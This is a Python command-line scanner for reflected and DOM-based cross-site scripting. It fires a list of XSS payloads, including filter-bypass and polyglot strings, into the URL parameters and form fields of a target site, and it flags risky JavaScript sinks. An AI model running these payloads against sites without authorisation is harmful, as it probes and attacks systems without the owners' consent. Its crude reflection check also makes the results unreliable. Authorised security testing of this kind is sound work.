#!/usr/bin/env python3
"""
XSS (Cross-Site Scripting) Scanner
Detects reflected, stored, and DOM-based XSS vulnerabilities
"""

from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import argparse
from colorama import Fore, Style, init
import json
import os
from typing import List, Dict
from bs4 import BeautifulSoup
import re
from utils.http_client import HttpClient
from utils.targets import normalize_url

init(autoreset=True)

class XSSScanner:
    def __init__(self, target_url: str, output_dir: str = "./results"):
        # Prefer https and normalize user input early to avoid malformed requests.
        self.target_url = normalize_url(target_url)
        self.output_dir = output_dir
        self.vulnerabilities: List[Dict] = []
        
        os.makedirs(output_dir, exist_ok=True)
        
        # XSS payloads - ordered from simple to complex
        self.payloads = [
            # Basic payloads
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            
            # Bypass filters
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            
            # Event handlers
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            
            # Advanced payloads
            "<details open ontoggle=alert('XSS')>",
            "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
            "<form><button formaction=javascript:alert('XSS')>Click",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            
            # Polyglot
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
        ]
        self.http = HttpClient(timeout=10)
    
    def print_banner(self):
        banner = f"""
{Fore.CYAN}╔═══════════════════════════════════════╗
║         XSS Scanner Tool              ║
║     Target: {self.target_url[:24]:<24}║
╚═══════════════════════════════════════╝{Style.RESET_ALL}
        """
        print(banner)
    
    def find_forms(self, url: str) -> List[Dict]:
        """Find all forms on a page"""
        try:
            response = self.http.get(url)
            if not response:
                return []
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_details = {
                    'action': form.get('action'),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_type = input_tag.get('type', 'text')
                    input_name = input_tag.get('name')
                    if input_name:
                        form_details['inputs'].append({
                            'type': input_type,
                            'name': input_name
                        })
                
                forms.append(form_details)
            
            return forms
        except Exception as e:
            print(f"{Fore.RED}[-] Error finding forms: {str(e)}{Style.RESET_ALL}")
            return []
    
    def test_reflected_xss_form(self, url: str, form: Dict) -> List[Dict]:
        """Test form for reflected XSS"""
        vulnerabilities = []
        action = urljoin(url, form['action']) if form['action'] else url
        
        print(f"{Fore.YELLOW}[*] Testing form at {action}{Style.RESET_ALL}")
        
        for payload in self.payloads[:10]:  # Test with subset of payloads
            data = {}
            for input_field in form['inputs']:
                if input_field['type'] not in ['submit', 'button']:
                    data[input_field['name']] = payload
            
            try:
                if form['method'] == 'post':
                    response = self.http.post(action, data=data)
                else:
                    response = self.http.get(action, params=data)
                
                if not response:
                    continue
                
                # Check if payload is reflected in response
                if payload in response.text:
                    # Check if it's actually executable (not encoded)
                    if self.is_executable(response.text, payload):
                        vuln = {
                            'type': 'Reflected XSS',
                            'url': action,
                            'method': form['method'].upper(),
                            'parameter': ', '.join([i['name'] for i in form['inputs']]),
                            'payload': payload,
                            'severity': 'High'
                        }
                        vulnerabilities.append(vuln)
                        print(f"{Fore.RED}[!] VULNERABILITY FOUND!{Style.RESET_ALL}")
                        print(f"    URL: {action}")
                        print(f"    Payload: {payload}")
                        break  # Found vulnerability, move to next form
            
            except Exception as e:
                pass
        
        return vulnerabilities
    
    def test_reflected_xss_url(self, url: str) -> List[Dict]:
        """Test URL parameters for reflected XSS"""
        vulnerabilities = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return vulnerabilities
        
        print(f"{Fore.YELLOW}[*] Testing URL parameters{Style.RESET_ALL}")
        
        for param in params.keys():
            for payload in self.payloads[:10]:
                test_params = params.copy()
                test_params[param] = [payload]
                
                # Rebuild URL with payload
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                try:
                    response = self.http.get(test_url)
                    
                    if not response:
                        continue
                    
                    if payload in response.text:
                        if self.is_executable(response.text, payload):
                            vuln = {
                                'type': 'Reflected XSS',
                                'url': test_url,
                                'method': 'GET',
                                'parameter': param,
                                'payload': payload,
                                'severity': 'High'
                            }
                            vulnerabilities.append(vuln)
                            print(f"{Fore.RED}[!] VULNERABILITY FOUND!{Style.RESET_ALL}")
                            print(f"    Parameter: {param}")
                            print(f"    Payload: {payload}")
                            break
                
                except Exception as e:
                    pass
        
        return vulnerabilities
    
    def is_executable(self, html: str, payload: str) -> bool:
        """Check if payload is executable (not HTML encoded)"""
        # Check if payload appears unencoded
        dangerous_chars = ['<', '>', '"', "'", 'script', 'onerror', 'onload']
        
        # Find payload in HTML
        payload_index = html.find(payload)
        if payload_index == -1:
            return False
        
        # Check if it's inside a script tag or event handler
        context = html[max(0, payload_index-100):min(len(html), payload_index+100)]
        
        # Simple check: if special chars are not encoded, likely executable
        for char in ['<', '>', '"', "'"]:
            if char in payload and char in context:
                return True
        
        return False
    
    def scan_dom_xss(self, url: str) -> List[Dict]:
        """Scan for DOM-based XSS vulnerabilities"""
        vulnerabilities = []
        
        try:
            response = self.http.get(url)
            if not response:
                return vulnerabilities
            
            # Look for dangerous JavaScript patterns
            dangerous_patterns = [
                r'document\.write\s*\(',
                r'innerHTML\s*=',
                r'outerHTML\s*=',
                r'eval\s*\(',
                r'setTimeout\s*\(',
                r'setInterval\s*\(',
                r'location\.href\s*=',
                r'location\.search',
                r'location\.hash',
            ]
            
            for pattern in dangerous_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    vuln = {
                        'type': 'Potential DOM XSS',
                        'url': url,
                        'method': 'GET',
                        'parameter': 'JavaScript Analysis',
                        'payload': f'Dangerous pattern: {pattern}',
                        'severity': 'Medium'
                    }
                    vulnerabilities.append(vuln)
                    print(f"{Fore.YELLOW}[!] Potential DOM XSS pattern found: {pattern}{Style.RESET_ALL}")
        
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def save_results(self):
        """Save scan results"""
        domain = urlparse(self.target_url).netloc
        output_file = os.path.join(self.output_dir, f"{domain}_xss_scan.json")
        
        data = {
            "target": self.target_url,
            "total_vulnerabilities": len(self.vulnerabilities),
            "vulnerabilities": self.vulnerabilities
        }
        
        with open(output_file, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"\n{Fore.CYAN}[*] Results saved to: {output_file}{Style.RESET_ALL}")
    
    def print_summary(self):
        """Print scan summary"""
        print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}XSS Scan Summary{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Total vulnerabilities found: {len(self.vulnerabilities)}{Style.RESET_ALL}")
        
        high = sum(1 for v in self.vulnerabilities if v['severity'] == 'High')
        medium = sum(1 for v in self.vulnerabilities if v['severity'] == 'Medium')
        
        if high > 0:
            print(f"{Fore.RED}High severity: {high}{Style.RESET_ALL}")
        if medium > 0:
            print(f"{Fore.YELLOW}Medium severity: {medium}{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")
    
    def run(self):
        """Execute XSS scan"""
        self.print_banner()
        
        # Test URL parameters
        url_vulns = self.test_reflected_xss_url(self.target_url)
        self.vulnerabilities.extend(url_vulns)
        
        # Find and test forms
        forms = self.find_forms(self.target_url)
        print(f"{Fore.CYAN}[*] Found {len(forms)} forms{Style.RESET_ALL}")
        
        for form in forms:
            form_vulns = self.test_reflected_xss_form(self.target_url, form)
            self.vulnerabilities.extend(form_vulns)
        
        # Scan for DOM XSS
        dom_vulns = self.scan_dom_xss(self.target_url)
        self.vulnerabilities.extend(dom_vulns)
        
        self.print_summary()
        self.save_results()


def main():
    parser = argparse.ArgumentParser(description="XSS Scanner Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-o", "--output", default="./results", help="Output directory")
    
    args = parser.parse_args()
    
    scanner = XSSScanner(args.url, args.output)
    scanner.run()


if __name__ == "__main__":
    main()
